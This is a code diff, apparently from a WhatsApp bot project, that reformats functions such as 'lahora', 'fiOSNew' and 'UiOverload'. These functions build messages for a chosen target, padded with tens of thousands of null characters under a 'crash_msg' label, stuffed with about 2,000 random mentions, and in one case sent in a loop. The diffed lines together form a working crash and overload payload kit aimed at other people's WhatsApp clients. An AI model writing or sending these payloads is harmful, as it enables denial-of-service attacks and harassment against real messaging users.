@@ -18,11 +18,7 @@ export async function lahora(sock, target) {
         body: { text: "izin @mexxreall" },
         nativeFlowMessage: {
           buttons:
-            "crash_msg" +
-            "\0".repeat(20000) +
-            "\u0000".repeat(1000) +
-            "\u0000".repeat(30000) +
-            "\u0000".repeat(4000),
+            "crash_msg" + "\0".repeat(20000) + "\u0000".repeat(1000) + "\u0000".repeat(30000) + "\u0000".repeat(4000),
         },
       },
     };
@@ -33,8 +29,7 @@ export async function lahora(sock, target) {
         nativeFlowMessage: {
           buttons: {
             name: "meta_mesaage",
-            buttonParamsJson:
-              "\0".repeat(20000) + "\u0000".repeat(1000) + "\u0000".repeat(4000),
+            buttonParamsJson: "\0".repeat(20000) + "\u0000".repeat(1000) + "\u0000".repeat(4000),
           },
         },
       },
@@ -74,9 +69,7 @@ export async function lahora(sock, target) {
               contextInfo: {
                 mentionedJid: [
                   "0@s.whatsapp.net",
-                  ...Array.from({ length: 1999 }, () =>
-                    `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`,
-                  ),
+                  ...Array.from({ length: 1999 }, () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`),
                 ],
               },
               viewOnceMessage: {
@@ -86,7 +79,7 @@ export async function lahora(sock, target) {
           },
         },
       },
-      {},
+      {}
     );
   } catch (e) {
     throw new Error(e?.message || "lahora gagal");
@@ -130,7 +123,7 @@ END:VCARD`,
         },
       },
     },
-    { participant: true },
+    { participant: true }
   );
 }
 
@@ -160,7 +153,7 @@ export async function fiOSNew(sock, target, count = 1) {
           },
         },
       },
-      { isSecret: true },
+      { isSecret: true }
     );
     await sleep(1000);
   }
@@ -186,6 +179,6 @@ export async function UiOverload(sock, target) {
         inviteLinkGroupTypeV2: "DEFAULT",
       },
     },
-    { participant: { jid: target } },
+    { participant: { jid: target } }
   );
 }
